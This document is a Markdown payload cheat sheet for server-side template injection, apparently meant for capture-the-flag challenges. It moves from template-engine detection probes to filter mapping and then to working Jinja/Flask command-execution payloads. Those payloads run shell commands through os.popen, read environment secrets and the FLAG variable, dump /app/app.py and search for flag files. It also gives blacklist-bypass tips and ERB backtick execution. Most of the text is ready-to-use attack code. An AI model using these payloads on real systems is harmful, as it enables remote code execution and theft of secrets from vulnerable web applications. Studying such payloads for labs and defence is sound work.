# SSTI Payload Ladder

Use top-to-bottom. Stop once the intended flag path is proven.

## 1. Generic Detection

```text
ssti_probe_marker
{{7*7}}
{{7*'7'}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```

Signals:

- `49` from `{{7*7}}`: Jinja/Twig/Nunjucks-family expression evaluation.
- `7777777` from `{{7*'7'}}`: Python/Jinja-style string multiplication.
- Literal reflection only: try another input surface or engine family.
- Error page: capture exact parser words.

## 2. Filter Mapping

Test one feature per payload:

```jinja2
{{"x"}}
{{[1,2,3]|length}}
{{dict(a=1)}}
{{''.__class__}}
{{''["__class__"]}}
{{''|attr("__class__")}}
{% for x in [1,2] %}{{x}}{% endfor %}
```

Classify:

```text
renders | template-error | 500 | redirect | default-reset | custom-block-message
```

Do not continue mapping once a clean pivot is available.

## 3. Jinja/Flask

Context and helpers:

```jinja2
{{cycler}}
{{joiner}}
{{namespace}}
{{lipsum}}
{{url_for}}
```

Fast helper-global pivot:

```jinja2
{{cycler.__init__.__globals__}}
{{cycler.__init__.__globals__.os}}
{{cycler.__init__.__globals__.os.popen("id").read()}}
{{cycler.__init__.__globals__.os.popen("pwd").read()}}
{{cycler.__init__.__globals__.os.popen("find / -maxdepth 3 -iname '*flag*' 2>/dev/null").read()}}
{{cycler.__init__.__globals__.os.popen("printenv FLAG").read()}}
{{cycler.__init__.__globals__.os.popen("sed -n '1,180p' /app/app.py").read()}}
```

Import/env route when not filtered:

```jinja2
{{cycler.__init__.__globals__.__builtins__.__import__('os').environ['FLAG']}}
```

Common blacklist bypass choice:

- `request`, `config`, `self` blocked: use `cycler`, `joiner`, `namespace`.
- `import` blocked: use existing `os` in helper globals.
- `{% %}` stripped: keep all logic inside `{{ }}` expressions or shell command strings.
- Dot blocked: try bracket lookup or `attr`, if those are not blocked.

## 4. Twig/PHP

```twig
{{7*7}}
{{_self}}
{{app}}
{{constant('PHP_VERSION')}}
```

Prefer config/source disclosure unless obvious command execution functions are enabled.

## 5. ERB/Ruby

```erb
<%= 7*7 %>
<%= RUBY_VERSION %>
<%= `id` %>
```

## 6. Node Template Engines

```text
<%= 7*7 %>
#{7*7}
{{7*7}}
```

Use JS bundles, stack traces, package names, and source maps to distinguish EJS, Pug, Handlebars, Mustache, and Nunjucks before escalating.
